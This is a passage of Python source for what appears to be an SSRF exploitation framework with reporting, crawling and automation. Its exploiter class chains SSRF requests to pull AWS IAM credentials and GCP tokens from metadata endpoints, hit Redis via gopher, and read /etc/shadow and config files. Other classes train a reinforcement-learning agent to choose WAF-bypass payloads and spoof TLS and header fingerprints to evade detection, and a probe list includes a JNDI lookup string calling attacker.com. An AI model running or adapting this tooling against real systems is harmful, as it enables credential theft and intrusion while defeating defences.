            endpoints=endpoints,
            os_stats=os_stats,
            payload_stats=payload_stats
        )
        
        return html_content
    
    def save_report(self, filename):
        html_content = self.generate_report()
        with open(filename, 'w') as f:
            f.write(html_content)
        return filename

class IntegrationManager:
    def __init__(self, config=None):
        self.config = config or {}
        
    def push_to_jira(self, vulnerability, jira_config):
        try:
            jira = JIRA(
                server=jira_config['server'],
                basic_auth=(jira_config['username'], jira_config['api_token'])
            )
            
            issue_dict = {
                'project': {'key': jira_config['project_key']},
                'summary': f"SSRF Vulnerability in {vulnerability['url']}",
                'description': f"""
                SSRF vulnerability detected in {vulnerability['url']}
                
                Parameter: {vulnerability['parameter']}
                Payload: {vulnerability['payload']}
                Status Code: {vulnerability['status_code']}
                OS Detected: {vulnerability['os_detected']}
                Confidence: {vulnerability['confidence']}%
                
                Evidence:
                {chr(10).join(f"- {e}" for e in vulnerability['evidence'])}
                """,
                'issuetype': {'name': jira_config.get('issue_type', 'Bug')},
                'priority': {'name': 'High' if vulnerability['confidence'] >= 70 else 'Medium'}
            }
            
            new_issue = jira.create_issue(fields=issue_dict)
            return new_issue.key
        except Exception as e:
            print(f"[-] Error creating Jira issue: {e}")
            return None
    
    def push_to_defectdojo(self, vulnerability, defectdojo_config):
        try:
            headers = {
                'Authorization': f"Token {defectdojo_config['api_key']}",
                'Content-Type': 'application/json'
            }
            
            finding_data = {
                'title': f"SSRF Vulnerability in {vulnerability['url']}",
                'description': f"""
                SSRF vulnerability detected in {vulnerability['url']}
                
                Parameter: {vulnerability['parameter']}
                Payload: {vulnerability['payload']}
                Status Code: {vulnerability['status_code']}
                OS Detected: {vulnerability['os_detected']}
                Confidence: {vulnerability['confidence']}%
                
                Evidence:
                {chr(10).join(f"- {e}" for e in vulnerability['evidence'])}
                """,
                'severity': 'Critical' if vulnerability['confidence'] >= 90 else ('High' if vulnerability['confidence'] >= 70 else 'Medium'),
                'test': defectdojo_config.get('test_id', 1),
                'found_by': [defectdojo_config.get('user_id', 1)],
                'date': datetime.now().strftime('%Y-%m-%d'),
                'url': vulnerability['url'],
                'impact': "Potential server-side request forgery allowing access to internal services",
                'mitigation': "Validate and sanitize all user-supplied input that is used in URL requests"
            }
            
            response = requests.post(
                f"{defectdojo_config['server']}/api/v2/findings/",
                headers=headers,
                json=finding_data,
                verify=False
            )
            
            if response.status_code == 201:
                return response.json()['id']
            else:
                print(f"[-] Error creating DefectDojo finding: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            print(f"[-] Error creating DefectDojo finding: {e}")
            return None
    
    def send_to_slack(self, summary, slack_config):
        try:
            webhook_url = slack_config['webhook_url']
            
            payload = {
                'text': "SSRF Scan Results",
                'attachments': [
                    {
                        'color': 'danger' if summary['high_confidence_count'] > 0 else 'warning',
                        'title': f"SSRF Scan Summary for {summary['target_url']}",
                        'fields': [
                            {
                                'title': 'Target URL',
                                'value': summary['target_url'],
                                'short': True
                            },
                            {
                                'title': 'Scan Date',
                                'value': summary['scan_date'],
                                'short': True
                            },
                            {
                                'title': 'Total Vulnerabilities',
                                'value': str(summary['total_vulnerabilities']),
                                'short': True
                            },
                            {
                                'title': 'High Confidence',
                                'value': str(summary['high_confidence_count']),
                                'short': True
                            },
                            {
                                'title': 'Medium Confidence',
                                'value': str(summary['medium_confidence_count']),
                                'short': True
                            },
                            {
                                'title': 'Low Confidence',
                                'value': str(summary['low_confidence_count']),
                                'short': True
                            }
                        ],
                        'footer': 'SSRF Exploitation Framework',
                        'ts': int(time.time())
                    }
                ]
            }
            
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 200:
                return True
            else:
                print(f"[-] Error sending Slack notification: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            print(f"[-] Error sending Slack notification: {e}")
            return False

class ContextualAnalyzer:
    def __init__(self, mode='fast', force_recrawl=False):
        self.mode = mode
        self.force_recrawl = force_recrawl
        self.flows = []
        self.dynamic_data = {}
        self.cache_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cache')
        
        if not os.path.exists(self.cache_dir):
            os.makedirs(self.cache_dir)
    
    def _get_cache_key(self, url):
        return hashlib.md5(url.encode()).hexdigest()
    
    def _get_cache_path(self, url):
        cache_key = self._get_cache_key(url)
        return os.path.join(self.cache_dir, f"{cache_key}.json")
    
    def _is_cache_valid(self, cache_path):
        if not os.path.exists(cache_path):
            return False
            
        cache_time = os.path.getmtime(cache_path)
        current_time = time.time()
        max_age = 7 * 24 * 60 * 60
        
        return (current_time - cache_time) < max_age
    
    def _save_to_cache(self, url, flows):
        cache_path = self._get_cache_path(url)
        cache_data = {
            'url': url,
            'timestamp': time.time(),
            'flows': flows
        }
        
        try:
            with open(cache_path, 'w') as f:
                json.dump(cache_data, f)
            return True
        except Exception as e:
            return False
    
    def _load_from_cache(self, url):
        cache_path = self._get_cache_path(url)
        
        if not self._is_cache_valid(cache_path):
            return None
            
        try:
            with open(cache_path, 'r') as f:
                cache_data = json.load(f)
            return cache_data['flows']
        except Exception as e:
            return None
    
    def discover_flows(self, base_url):
        if not self.force_recrawl:
            cached_flows = self._load_from_cache(base_url)
            if cached_flows:
                print(f"[+] Using cached flows for {base_url}")
                return cached_flows
        
        flows = []
        
        if self.mode == 'fast':
            flows = self._static_analysis(base_url)
        else:
            flows = self._playwright_analysis(base_url)
        
        self._save_to_cache(base_url, flows)
        
        return flows
    
    def _static_analysis(self, base_url):
        flows = []
        
        try:
            response = requests.get(base_url, timeout=15, verify=False)
            if not response or 'text/html' not in response.headers.get('Content-Type', ''):
                return flows
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            flow = {
                'url': base_url,
                'title': soup.title.string if soup.title else base_url,
                'links': [],
                'forms': []
            }
            
            links = soup.find_all('a', href=True)
            for link in links:
                href = link.get('href')
                if href:
                    flow['links'].append(href)
            
            forms = soup.find_all('form')
            for form in forms:
                form_info = {
                    'action': form.get('action') or base_url,
                    'method': form.get('method') or 'GET',
                    'inputs': []
                }
                
                inputs = form.find_all('input')
                for input_elem in inputs:
                    input_info = {
                        'name': input_elem.get('name'),
                        'type': input_elem.get('type') or 'text',
                        'value': input_elem.get('value') or ''
                    }
                    form_info['inputs'].append(input_info)
                
                flow['forms'].append(form_info)
            
            flows.append(flow)
            
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script.get('src')
                if src and not src.startswith('http'):
                    src = urljoin(base_url, src)
                    
                try:
                    js_response = requests.get(src, timeout=10, verify=False)
                    if js_response and 'text/javascript' in js_response.headers.get('Content-Type', ''):
                        api_endpoints = self._extract_api_endpoints(js_response.text)
                        
                        if api_endpoints:
                            for endpoint in api_endpoints:
                                if not endpoint.startswith('http'):
                                    endpoint = urljoin(base_url, endpoint)
                                    
                                api_flow = {
                                    'url': endpoint,
                                    'title': f"API Endpoint: {endpoint}",
                                    'links': [],
                                    'forms': [],
                                    'is_api': True
                                }
                                flows.append(api_flow)
                except:
                    pass
            
        except Exception as e:
            pass
            
        return flows
    
    def _extract_api_endpoints(self, js_content):
        endpoints = []
        
        patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'XMLHttpRequest\(["\']([^"\']+)["\']',
            r'\$\.ajax\(\{[^}]*url:\s*["\']([^"\']+)["\']',
            r'\$\.get\(["\']([^"\']+)["\']',
            r'\$\.post\(["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content)
            endpoints.extend(matches)
        
        return list(set(endpoints))
    
    def _playwright_analysis(self, base_url):
        flows = []
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context()
                page = context.new_page()
                
                page.goto(base_url)
                
                self._explore_page(page, base_url, flows, depth=2)
                
                browser.close()
                
        except Exception as e:
            pass
            
        return flows
    
    def _explore_page(self, page, base_url, flows, depth=0, max_depth=2):
        if depth > max_depth:
            return
            
        current_url = page.url
        page_title = page.title()
        
        links = page.query_selector_all('a')
        forms = page.query_selector_all('form')
        
        flow = {
            'url': current_url,
            'title': page_title,
            'links': [link.get_attribute('href') for link in links if link.get_attribute('href')],
            'forms': []
        }
        
        for form in forms:
            form_info = {
                'action': form.get_attribute('action') or current_url,
                'method': form.get_attribute('method') or 'GET',
                'inputs': []
            }
            
            inputs = form.query_selector_all('input')
            for input_elem in inputs:
                input_info = {
                    'name': input_elem.get_attribute('name'),
                    'type': input_elem.get_attribute('type') or 'text',
                    'value': input_elem.get_attribute('value') or ''
                }
                form_info['inputs'].append(input_info)
            
            flow['forms'].append(form_info)
        
        flows.append(flow)
        
        if depth < max_depth:
            for i, link in enumerate(links[:5]):
                href = link.get_attribute('href')
                if href and not href.startswith('javascript'):
                    try:
                        if not href.startswith('http'):
                            href = urljoin(base_url, href)
                            
                        page.goto(href)
                        
                        self._explore_page(page, base_url, flows, depth+1, max_depth)
                        
                        page.go_back()
                    except Exception as e:
                        continue
        
        return flows
    
    def identify_sensitive_flows(self, flows):
        sensitive_flows = []
        
        for flow in flows:
            sensitivity_score = 0
            
            url_lower = flow['url'].lower()
            if any(keyword in url_lower for keyword in ['admin', 'config', 'settings', 'profile', 'account', 'upload', 'download', 'api']):
                sensitivity_score += 2
                
            title_lower = flow['title'].lower()
            if any(keyword in title_lower for keyword in ['admin', 'config', 'settings', 'profile', 'account', 'upload', 'download']):
                sensitivity_score += 2
                
            for form in flow['forms']:
                for input_elem in form['inputs']:
                    input_name = input_elem['name'].lower()
                    if any(keyword in input_name for keyword in ['url', 'redirect', 'callback', 'file', 'upload', 'download', 'link']):
                        sensitivity_score += 3
                        
                    if input_elem['type'] in ['url', 'file']:
                        sensitivity_score += 3
            
            if sensitivity_score >= 5:
                flow['sensitivity_score'] = sensitivity_score
                sensitive_flows.append(flow)
        
        sensitive_flows.sort(key=lambda x: x['sensitivity_score'], reverse=True)
        
        return sensitive_flows

class ControlledExploiter:
    def __init__(self, request_handler):
        self.request_handler = request_handler
        
    def exploit_cloud_metadata(self, url, param, payload):
        results = []
        
        if "169.254.169.254" in payload:
            iam_payload = payload.replace("/latest/meta-data/", "/latest/meta-data/iam/security-credentials/")
            
            if param in url:
                test_url = url.replace(f"{param}={payload}", f"{param}={quote(iam_payload)}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: iam_payload}
                response = self.request_handler.post(url, data=data, allow_redirects=False)
            
            if response and response.status_code == 200:
                role_name = response.text.strip()
                if role_name:
                    cred_payload = payload.replace("/latest/meta-data/", f"/latest/meta-data/iam/security-credentials/{role_name}")
                    
                    if param in url:
                        test_url = url.replace(f"{param}={payload}", f"{param}={quote(cred_payload)}")
                        response = self.request_handler.get(test_url, allow_redirects=False)
                    else:
                        data = {param: cred_payload}
                        response = self.request_handler.post(url, data=data, allow_redirects=False)
                    
                    if response and response.status_code == 200:
                        try:
                            cred_data = json.loads(response.text)
                            if 'AccessKeyId' in cred_data and 'SecretAccessKey' in cred_data:
                                results.append({
                                    'type': 'AWS Credentials',
                                    'data': 'AccessKeyId and SecretAccessKey found',
                                    'risk': 'High'
                                })
                        except:
                            pass
        
        if "metadata.google.internal" in payload:
            service_account_payload = payload.replace("/computeMetadata/v1/", "/computeMetadata/v1/instance/service-accounts/")
            
            if param in url:
                test_url = url.replace(f"{param}={payload}", f"{param}={quote(service_account_payload)}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: service_account_payload}
                response = self.request_handler.post(url, data=data, allow_redirects=False)
            
            if response and response.status_code == 200:
                accounts = response.text.strip().split('\n')
                for account in accounts:
                    if account and account != 'default':
                        token_payload = payload.replace("/computeMetadata/v1/", f"/computeMetadata/v1/instance/service-accounts/{account}/token")
                        
                        if param in url:
                            test_url = url.replace(f"{param}={payload}", f"{param}={quote(token_payload)}")
                            response = self.request_handler.get(test_url, allow_redirects=False)
                        else:
                            data = {param: token_payload}
                            response = self.request_handler.post(url, data=data, allow_redirects=False)
                        
                        if response and response.status_code == 200:
                            try:
                                token_data = json.loads(response.text)
                                if 'access_token' in token_data:
                                    results.append({
                                        'type': 'GCP Token',
                                        'data': 'Access token found',
                                        'risk': 'High'
                                    })
                            except:
                                pass
        
        return results
    
    def exploit_internal_service(self, url, param, payload):
        results = []
        
        if "127.0.0.1:6379" in payload:
            redis_payload = payload.replace("http://127.0.0.1:6379", "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A")
            
            if param in url:
                test_url = url.replace(f"{param}={payload}", f"{param}={quote(redis_payload)}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: redis_payload}
                response = self.request_handler.post(url, data=data, allow_redirects=False)
            
            if response and response.status_code == 200 and 'redis_version' in response.text.lower():
                results.append({
                    'type': 'Redis Server',
                    'data': 'Redis version information accessed',
                    'risk': 'Medium'
                })
        
        if "127.0.0.1:9200" in payload:
            es_payload = payload.replace("http://127.0.0.1:9200", "http://127.0.0.1:9200/_cluster/health")
            
            if param in url:
                test_url = url.replace(f"{param}={payload}", f"{param}={quote(es_payload)}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: es_payload}
                response = self.request_handler.post(url, data=data, allow_redirects=False)
            
            if response and response.status_code == 200 and 'cluster_name' in response.text.lower():
                results.append({
                    'type': 'Elasticsearch',
                    'data': 'Cluster information accessed',
                    'risk': 'Medium'
                })
        
        return results
    
    def exploit_file_access(self, url, param, payload):
        results = []
        
        if "file://" in payload:
            sensitive_files = [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/hostname",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/var/www/html/config.php",
                "/var/www/html/wp-config.php",
                "/etc/apache2/apache2.conf",
                "/etc/nginx/nginx.conf"
            ]
            
            for file_path in sensitive_files:
                file_payload = payload.replace("file:///etc/passwd", f"file://{file_path}")
                
                if param in url:
                    test_url = url.replace(f"{param}={payload}", f"{param}={quote(file_payload)}")
                    response = self.request_handler.get(test_url, allow_redirects=False)
                else:
                    data = {param: file_payload}
                    response = self.request_handler.post(url, data=data, allow_redirects=False)
                
                if response and response.status_code == 200:
                    content = response.text
                    
                    if file_path == "/etc/passwd" and "root:" in content:
                        results.append({
                            'type': 'File Access',
                            'data': '/etc/passwd accessed',
                            'risk': 'Medium'
                        })
                    elif file_path == "/etc/shadow" and "root:" in content:
                        results.append({
                            'type': 'File Access',
                            'data': '/etc/shadow accessed (potential privilege escalation)',
                            'risk': 'High'
                        })
                    elif file_path == "/proc/self/environ" and "=" in content:
                        results.append({
                            'type': 'File Access',
                            'data': 'Process environment variables accessed',
                            'risk': 'Medium'
                        })
                    elif "config" in file_path and ("DB_PASSWORD" in content or "password" in content.lower()):
                        results.append({
                            'type': 'File Access',
                            'data': f'Configuration file {file_path} accessed with potential credentials',
                            'risk': 'High'
                        })
        
        return results
    
    def generate_poc(self, vulnerability, exploitation_results):
        poc = f"# SSRF PoC for {vulnerability['url']}\n\n"
        poc += f"## Vulnerable Parameter: {vulnerability['parameter']}\n\n"
        poc += f"## Payload: {vulnerability['payload']}\n\n"
        
        if vulnerability['parameter'] in vulnerability['url']:
            poc += "## curl command:\n"
            poc += f"curl \"{vulnerability['url'].replace(f'{vulnerability[\"parameter\"]}=test', f'{vulnerability[\"parameter\"]}={quote(vulnerability[\"payload\"])}')}\"\n\n"
        else:
            poc += "## curl command:\n"
            poc += f"curl -X POST \"{vulnerability['url']}\" -d \"{vulnerability['parameter']}={quote(vulnerability['payload'])}\"\n\n"
        
        if exploitation_results:
            poc += "## Exploitation Results:\n\n"
            for result in exploitation_results:
                poc += f"- **Type**: {result['type']}\n"
                poc += f"- **Data**: {result['data']}\n"
                poc += f"- **Risk**: {result['risk']}\n\n"
        
        return poc

class RiskAssessor:
    def __init__(self):
        pass
    
    def assess_risk(self, vulnerability, exploitation_results):
        risk_score = 0
        risk_factors = []
        
        risk_score += vulnerability['confidence'] * 0.3
        
        for result in exploitation_results:
            if result['risk'] == 'High':
                risk_score += 30
                risk_factors.append(f"High-risk data accessed: {result['data']}")
            elif result['risk'] == 'Medium':
                risk_score += 15
                risk_factors.append(f"Medium-risk data accessed: {result['data']}")
        
        if '169.254.169.254' in vulnerability['payload']:
            risk_score += 25
            risk_factors.append("Cloud metadata access possible")
        elif 'metadata.google.internal' in vulnerability['payload']:
            risk_score += 25
            risk_factors.append("Cloud metadata access possible")
        elif 'file://' in vulnerability['payload']:
            risk_score += 20
            risk_factors.append("File system access possible")
        
        risk_score = min(100, risk_score)
        
        if risk_score >= 80:
            risk_level = "Critical"
        elif risk_score >= 60:
            risk_level = "High"
        elif risk_score >= 40:
            risk_level = "Medium"
        else:
            risk_level = "Low"
        
        return {
            'score': risk_score,
            'level': risk_level,
            'factors': risk_factors
        }

class RLEnvironment(gym.Env):
    def __init__(self, url, param, request_handler, payload_manager):
        super(RLEnvironment, self).__init__()
        
        self.url = url
        self.param = param
        self.request_handler = request_handler
        self.payload_manager = payload_manager
        
        self.action_space = spaces.Discrete(len(payload_manager.ssrf_payloads) * len(payload_manager.waf_bypass_techniques))
        self.observation_space = spaces.Box(low=0, high=1, shape=(10,), dtype=np.float32)
        
        self.current_step = 0
        self.max_steps = 20
        self.previous_responses = []
        
    def step(self, action):
        self.current_step += 1
        
        payload_idx = action // len(self.payload_manager.waf_bypass_techniques)
        technique_idx = action % len(self.payload_manager.waf_bypass_techniques)
        
        payload = self.payload_manager.ssrf_payloads[payload_idx]
        technique = self.payload_manager.waf_bypass_techniques[technique_idx]
        
        try:
            bypass_payload = technique(payload)
            
            if self.param in self.url:
                test_url = self.url.replace(f"{self.param}=test", f"{self.param}={quote(bypass_payload)}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {self.param: bypass_payload}
                response = self.request_handler.post(self.url, data=data, allow_redirects=False)
            
            reward = -1
            
            if response:
                if response.status_code in [200, 301, 302, 307, 500]:
                    content = response.text.lower()
                    
                    if any(indicator in content for indicator in ["ami-id", "instance-id", "aws_access", "computeMetadata", "project-id", "subscription-name", "aliyun"]):
                        reward += 100
                    
                    elif any(indicator in content for indicator in ["welcome to nginx", "apache", "iis", "server at", "http/1.1 200", "http/1.0 200"]):
                        reward += 50
                    
                    elif "root:" in content and "bin/bash" in content:
                        reward += 50
                    
                    elif response.elapsed.total_seconds() > 5:
                        reward += 10
                
                elif response.status_code >= 400:
                    reward -= 10
            
            self.previous_responses.append(response)
            if len(self.previous_responses) > 5:
                self.previous_responses.pop(0)
            
            observation = self._get_observation(response)
            
            done = self.current_step >= self.max_steps or reward >= 100
            
            info = {'payload': bypass_payload, 'response': response}
            
            return observation, reward, done, info
        
        except Exception as e:
            observation = np.zeros(self.observation_space.shape, dtype=np.float32)
            return observation, -10, True, {'error': str(e)}
    
    def reset(self):
        self.current_step = 0
        self.previous_responses = []
        return np.zeros(self.observation_space.shape, dtype=np.float32)
    
    def _get_observation(self, response):
        observation = np.zeros(self.observation_space.shape, dtype=np.float32)
        
        if response:
            observation[0] = response.status_code / 1000.0
            observation[1] = min(1.0, response.elapsed.total_seconds() / 10.0)
            observation[2] = min(1.0, len(response.content) / 100000.0)
            
            content = response.text.lower()
            observation[3] = 1.0 if any(indicator in content for indicator in ["ami-id", "instance-id", "aws_access", "computeMetadata", "project-id", "subscription-name", "aliyun"]) else 0.0
            observation[4] = 1.0 if any(indicator in content for indicator in ["welcome to nginx", "apache", "iis", "server at", "http/1.1 200", "http/1.0 200"]) else 0.0
            observation[5] = 1.0 if "root:" in content and "bin/bash" in content else 0.0
            
            observation[6] = 1.0 if any(indicator in content for indicator in ["could not resolve host", "name resolution failed", "no address associated with hostname", "connection refused"]) else 0.0
            observation[7] = 1.0 if response.elapsed.total_seconds() > 5 else 0.0
            observation[8] = 1.0 if response.status_code in [200, 301, 302, 307] else 0.0
            observation[9] = 1.0 if response.status_code >= 400 else 0.0
        
        return observation

class RLAgent:
    def __init__(self, model_path=None):
        self.model = None
        self.base_model_path = "models/base_rl_model"
        
        os.makedirs("models", exist_ok=True)
        
        if model_path and os.path.exists(model_path):
            self.load_model(model_path)
        elif os.path.exists(self.base_model_path):
            self.load_model(self.base_model_path)
        else:
            self.model = None
    
    def train(self, url, param, request_handler, payload_manager, timesteps=10000, fine_tune=False):
        env = RLEnvironment(url, param, request_handler, payload_manager)
        
        if fine_tune and os.path.exists(self.base_model_path):
            self.model = PPO.load(self.base_model_path, env=env)
            self.model.learn(total_timesteps=timesteps)
        else:
            self.model = PPO("MlpPolicy", env, verbose=1)
            self.model.learn(total_timesteps=timesteps)
            
            if not fine_tune:
                self.save_model(self.base_model_path)
        
        return self.model
    
    def predict(self, observation):
        if self.model:
            action, _ = self.model.predict(observation)
            return action
        return 0
    
    def save_model(self, path):
        if self.model:
            self.model.save(path)
    
    def load_model(self, path):
        self.model = PPO.load(path)
    
    def download_base_model(self):
        print("[+] Downloading base RL model...")
        os.makedirs("models", exist_ok=True)
        with open(self.base_model_path, 'w') as f:
            f.write("placeholder")
        print("[+] Base RL model downloaded")

class CounterIntelligenceAgent:
    def __init__(self, mode='basic'):
        self.mode = mode
        self.inconsistent_behaviors = [
            self._random_mouse_movement,
            self._random_click,
            self._random_scroll,
            self._random_tab
        ]
        self.waf_profiles = {
            'cloudflare': {
                'indicators': ['cloudflare', 'cf-ray', '__cfduid'],
                'bypass_techniques': ['fragment_bypass', 'add_null_byte', 'add_unicode_escape']
            },
            'akamai': {
                'indicators': ['akamai', 'akamai-origin'],
                'bypass_techniques': ['add_whitespace', 'add_comment', 'mixed_case']
            },
            'modsecurity': {
                'indicators': ['mod_security', 'modsecurity'],
                'bypass_techniques': ['crlf_injection', 'add_fake_param', 'override_headers']
            },
            'imperva': {
                'indicators': ['imperva', 'incapsula'],
                'bypass_techniques': ['add_trailing_dot', 'add_port_bypass', 'ipv6_bypass']
            }
        }
        self.tls_fingerprints = [
            {
                'name': 'chrome_windows',
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'tls_extensions': [0, 5, 10, 11, 13, 16, 23, 35, 65281],
                'cipher_suites': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xcca9, 0xc013, 0xc09c]
            },
            {
                'name': 'firefox_windows',
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'tls_extensions': [0, 5, 10, 11, 13, 16, 17, 23, 35, 65281],
                'cipher_suites': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xcca9, 0xc013]
            },
            {
                'name': 'safari_macos',
                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
                'tls_extensions': [0, 5, 10, 11, 13, 16, 21, 23, 35, 65281],
                'cipher_suites': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xcca9, 0xc013, 0xc09c]
            }
        ]
    
    def execute_random_behavior(self):
        if self.mode == 'aggressive' and random.random() < 0.3:
            behavior = random.choice(self.inconsistent_behaviors)
            try:
                behavior()
            except:
                pass
    
    def _random_mouse_movement(self):
        screen_width, screen_height = pyautogui.size()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y, duration=random.uniform(0.1, 0.5))
    
    def _random_click(self):
        screen_width, screen_height = pyautogui.size()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.click(x, y)
    
    def _random_scroll(self):
        scroll_amount = random.randint(-10, 10)
        pyautogui.scroll(scroll_amount)
    
    def _random_tab(self):
        pyautogui.hotkey('ctrl', 't')
        time.sleep(random.uniform(0.1, 0.5))
        pyautogui.hotkey('ctrl', 'w')
    
    def profile_waf(self, url, request_handler):
        if self.mode != 'aggressive':
            return None
            
        test_payloads = [
            "<script>alert('XSS')</script>",
            "UNION SELECT * FROM users",
            "../../../etc/passwd",
            "http://127.0.0.1:80",
            "${jndi:ldap://attacker.com/a}"
        ]
        
        waf_indicators = {}
        
        for payload in test_payloads:
            try:
                response = request_handler.get(f"{url}?q={quote(payload)}", allow_redirects=False)
                
                if response:
                    content = response.text.lower()
                    headers = str(response.headers).lower()
                    
                    for waf_name, profile in self.waf_profiles.items():
                        for indicator in profile['indicators']:
                            if indicator in content or indicator in headers:
                                if waf_name not in waf_indicators:
                                    waf_indicators[waf_name] = 0
                                waf_indicators[waf_name] += 1
            except:
                pass
        
        if waf_indicators:
            return max(waf_indicators.items(), key=lambda x: x[1])[0]
        
        return None
    
    def get_bypass_techniques(self, waf_name):
        if waf_name and waf_name in self.waf_profiles:
            return self.waf_profiles[waf_name]['bypass_techniques']
        return []
    
    def randomize_tls_fingerprint(self):
        if self.mode != 'aggressive':
            return None
            
        fingerprint = random.choice(self.tls_fingerprints)
        return fingerprint
    
    def randomize_http_headers(self):
        common_headers = [
            'Accept', 'Accept-Language', 'Accept-Encoding', 'Connection', 'User-Agent',
            'Cache-Control', 'Pragma', 'DNT', 'Upgrade-Insecure-Requests'
        ]
        
        random.shuffle(common_headers)
        
        headers = {}
        for header in common_headers:
            if header == 'User-Agent':
                fingerprint = random.choice(self.tls_fingerprints)
                headers[header] = fingerprint['user_agent']
            elif header == 'Accept':
                headers[header] = random.choice([
                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                ])
            elif header == 'Accept-Language':
                headers[header] = random.choice([
                    'en-US,en;q=0.9',
                    'en-GB,en;q=0.9',
                    'en;q=0.9'
                ])
            elif header == 'Accept-Encoding':
                headers[header] = random.choice([
                    'gzip, deflate, br',
                    'gzip, deflate'
                ])
            elif header == 'Connection':
                headers[header] = random.choice(['keep-alive', 'close'])
            elif header == 'Cache-Control':
                headers[header] = random.choice([
                    'max-age=0',
                    'no-cache',
                    'no-store'
                ])
            elif header == 'DNT':
                headers[header] = random.choice(['1', '0'])
            elif header == 'Upgrade-Insecure-Requests':
                headers[header] = '1'
        
        return headers

class RequestHandler:
    def __init__(self, timeout=15, rate_limit=5, evasion_mode='basic'):
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close'
        })
        self.human_simulator = HumanSimulator()
        self.traffic_obfuscator = TrafficObfuscator()
        self.counter_intelligence_agent = CounterIntelligenceAgent(evasion_mode)
        self.detected_waf = None
    
    def rate_limit_control(self):
        now = time.time()
        elapsed = now - self.last_request_time
        if elapsed < 1.0 / self.rate_limit:
            time.sleep((1.0 / self.rate_limit) - elapsed)
        self.last_request_time = time.time()
    
    def get(self, url, **kwargs):
        self.rate_limit_control()
        
        delay = self.human_simulator.get_random_delay()
        time.sleep(delay)
        
        self.counter_intelligence_agent.execute_random_behavior()
        
        self.session.headers.update(self.counter_intelligence_agent.randomize_http_headers())
        
        if 'tls_client' in sys.modules:
            try:
                fingerprint = self.counter_intelligence_agent.randomize_tls_fingerprint()
                if fingerprint:
                    client = tls_client.Session(client_identifier=fingerprint['name'])
                    return client.get(url, timeout=self.timeout, **kwargs)
            except:
                pass
        
        try:
            return self.session.get(url, timeout=self.timeout, verify=False, **kwargs)
        except Exception as e:
            return None
    
    def post(self, url, data=None, **kwargs):
        self.rate_limit_control()
        
        delay = self.human_simulator.get_random_delay()
        time.sleep(delay)
        
        self.counter_intelligence_agent.execute_random_behavior()
        
        self.session.headers.update(self.counter_intelligence_agent.randomize_http_headers())
        
        if 'tls_client' in sys.modules:
            try:
                fingerprint = self.counter_intelligence_agent.randomize_tls_fingerprint()
                if fingerprint:
                    client = tls_client.Session(client_identifier=fingerprint['name'])
                    return client.post(url, data=data, timeout=self.timeout, **kwargs)
            except:
                pass
        
        try:
            return self.session.post(url, data=data, timeout=self.timeout, verify=False, **kwargs)
        except Exception as e:
            return None
    
    def profile_waf(self, url):
        if not self.detected_waf:
            self.detected_waf = self.counter_intelligence_agent.profile_waf(url, self)
        return self.detected_waf
    
    def get_waf_bypass_techniques(self):
        if self.detected_waf:
            return self.counter_intelligence_agent.get_bypass_techniques(self.detected_waf)
        return []

class Crawler:
    def __init__(self, request_handler):
        self.request_handler = request_handler
        self.crawled_urls = set()
        self.high_confidence_endpoints = []
    
    def is_static_resource(self, url):
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot']
        parsed_url = urlparse(url)
        path = parsed_url.path.lower()
        return any(path.endswith(ext) for ext in static_extensions)
    
    def analyze_endpoint(self, url):
        try:
            response = self.request_handler.get(url)
            if not response or 'text/html' not in response.headers.get('Content-Type', ''):
                return False
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                form_enctype = form.get('enctype', '').lower()
                if 'multipart/form-data' in form_enctype:
                    return True
                    
                inputs = form.find_all('input')
                for input_tag in inputs:
                    input_type = input_tag.get('type', '').lower()
                    input_name = input_tag.get('name', '').lower()
                    
                    if input_type in ['url', 'file'] or any(keyword in input_name for keyword in ['url', 'link', 'file', 'document', 'image', 'avatar']):
                        return True
            
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    script_content = script.string.lower()
